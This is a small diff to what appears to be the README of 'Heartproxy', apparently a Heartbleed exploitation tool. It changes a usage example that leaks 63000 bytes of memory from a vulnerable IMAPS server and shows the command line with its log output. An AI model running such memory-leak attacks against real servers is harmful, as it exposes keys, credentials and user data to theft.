@@ -19,7 +19,7 @@ Synopsis
 Leaking 63000 Bytes from a vulnerable IMAPS server: 
 
 ``` 
-[foo@bar/term1]$ Heartproxy 8080 mail.vulnerable.com:993 64000
+[foo@bar/term1]$ Heartproxy 8080 mail.vulnerable.com:993 63000
 2014/04/10 14:25:18 Using leaksize 63000
 Listening on 8080
 2014/04/10 14:25:25 New connection from: localhost
